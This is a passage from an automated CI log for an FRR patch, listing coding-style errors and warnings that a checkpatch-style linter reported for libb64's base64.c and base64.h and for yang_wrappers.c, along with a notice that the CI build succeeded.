/tmp/f1-4770/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #36: FILE: /tmp/f1-4770/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #39: FILE: /tmp/f1-4770/base64.c:39:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #51: FILE: /tmp/f1-4770/base64.c:51:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #63: FILE: /tmp/f1-4770/base64.c:63:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #76: FILE: /tmp/f1-4770/base64.c:76:\n    +\t\t\tif (state_in->stepcount == CHARS_PER_LINE/4)\n    +\t\t\t{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-4770/base64.c:87:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-4770/base64.c:87:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #89: FILE: /tmp/f1-4770/base64.c:89:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #91: FILE: /tmp/f1-4770/base64.c:91:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-4770/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-4770/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-4770/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-4770/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-4770/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-4770/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-4770/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-4770/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-4770/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-4770/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-4770/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-4770/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-4770/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-4770/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-4770/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-4770/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #115: FILE: /tmp/f1-4770/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                    ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #115: FILE: /tmp/f1-4770/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                     ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-4770/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-4770/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-4770/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-4770/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-4770/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-4770/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-4770/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-4770/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-4770/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-4770/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-4770/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-4770/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                   ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-4770/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-4770/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-4770/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-4770/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t          ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-4770/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-4770/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-4770/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-4770/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-4770/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-4770/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-4770/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-4770/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-4770/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-4770/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-4770/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-4770/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-4770/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-4770/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-4770/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-4770/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-4770/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-4770/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-4770/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-4770/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-4770/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-4770/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-4770/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-4770/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-4770/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-4770/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-4770/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-4770/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-4770/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-4770/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-4770/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-4770/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-4770/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-4770/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-4770/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-4770/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-4770/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-4770/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-4770/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-4770/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-4770/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-4770/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-4770/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-4770/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-4770/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-4770/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-4770/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-4770/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-4770/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                    ^\n    \n    ERROR: trailing statements should be on next line\n    #126: FILE: /tmp/f1-4770/base64.c:126:\n    +\tif (value_in < 0 || value_in >= 80) return -1;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #130: FILE: /tmp/f1-4770/base64.c:130:\n    +void base64_init_decodestate(base64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #136: FILE: /tmp/f1-4770/base64.c:136:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #136: FILE: /tmp/f1-4770/base64.c:136:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #137: FILE: /tmp/f1-4770/base64.c:137:\n    +\t\t\tbase64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #139: FILE: /tmp/f1-4770/base64.c:139:\n    +\tconst char* codechar = code_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #140: FILE: /tmp/f1-4770/base64.c:140:\n    +\tchar* plainchar = plaintext_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #145: FILE: /tmp/f1-4770/base64.c:145:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #147: FILE: /tmp/f1-4770/base64.c:147:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #147: FILE: /tmp/f1-4770/base64.c:147:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #151: FILE: /tmp/f1-4770/base64.c:151:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #163: FILE: /tmp/f1-4770/base64.c:163:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #176: FILE: /tmp/f1-4770/base64.c:176:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #189: FILE: /tmp/f1-4770/base64.c:189:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    Report for base64.h | 85 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-4770/base64.h:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    WARNING: do not add new typedefs\n    #9: FILE: /tmp/f1-4770/base64.h:9:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #10: FILE: /tmp/f1-4770/base64.h:10:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #14: FILE: /tmp/f1-4770/base64.h:14:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #15: FILE: /tmp/f1-4770/base64.h:15:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #21: FILE: /tmp/f1-4770/base64.h:21:\n    +void base64_init_encodestate(base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-4770/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-4770/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-4770/base64.h:26:\n    +\t\t\tbase64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-4770/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-4770/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    WARNING: do not add new typedefs\n    #31: FILE: /tmp/f1-4770/base64.h:31:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #32: FILE: /tmp/f1-4770/base64.h:32:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #36: FILE: /tmp/f1-4770/base64.h:36:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #37: FILE: /tmp/f1-4770/base64.h:37:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #42: FILE: /tmp/f1-4770/base64.h:42:\n    +void base64_init_decodestate(base64_decodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-4770/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-4770/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #47: FILE: /tmp/f1-4770/base64.h:47:\n    +\t\t\tbase64_decodestate* state_in);\n    \n    WARNING: C99 // comments do not match recommendation\n    #49: FILE: /tmp/f1-4770/base64.h:49:\n    +#endif //_BASE64_H_\n    Report for yang_wrappers.c | 8 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-4770/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #691: FILE: /tmp/f1-4770/yang_wrappers.c:691:\n    < WARNING: Missing a blank line after declarations\n    < #696: FILE: /tmp/f1-4770/yang_wrappers.c:696:\n    < WARNING: Missing a blank line after declarations\n    < #709: FILE: /tmp/f1-4770/yang_wrappers.c:709:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3569/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n\n    <stdin>:285: new blank line at EOF.\n    +\n    warning: 1 line adds whitespace errors.\n    Report for base64.c | 72 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-11584/base64.c:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #10: FILE: /tmp/f1-11584/base64.c:10:\n    +void base64_init_encodestate(base64_encodestate* state_in)\n    \n    WARNING: line over 80 characters\n    #19: FILE: /tmp/f1-11584/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #19: FILE: /tmp/f1-11584/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    WARNING: Missing a blank line after declarations\n    #20: FILE: /tmp/f1-11584/base64.c:20:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    +\tif (value_in > 63) return '=';\n    \n    ERROR: trailing statements should be on next line\n    #20: FILE: /tmp/f1-11584/base64.c:20:\n    +\tif (value_in > 63) return '=';\n    \n    WARNING: line over 80 characters\n    #24: FILE: /tmp/f1-11584/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-11584/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-11584/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-11584/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-11584/base64.c:26:\n    +\tconst char* plainchar = plaintext_in;\n    \n    ERROR: \"foo* const bar\" should be \"foo * const bar\"\n    #27: FILE: /tmp/f1-11584/base64.c:27:\n    +\tconst char* const plaintextend = plaintext_in + length_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-11584/base64.c:28:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #34: FILE: /tmp/f1-11584/base64.c:34:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #36: FILE: /tmp/f1-11584/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #36: FILE: /tmp/f1-11584/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #39: FILE: /tmp/f1-11584/base64.c:39:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #51: FILE: /tmp/f1-11584/base64.c:51:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #63: FILE: /tmp/f1-11584/base64.c:63:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #76: FILE: /tmp/f1-11584/base64.c:76:\n    +\t\t\tif (state_in->stepcount == CHARS_PER_LINE/4)\n    +\t\t\t{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-11584/base64.c:87:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-11584/base64.c:87:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #89: FILE: /tmp/f1-11584/base64.c:89:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #91: FILE: /tmp/f1-11584/base64.c:91:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-11584/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-11584/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-11584/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-11584/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-11584/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-11584/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-11584/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-11584/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-11584/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-11584/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-11584/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-11584/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t     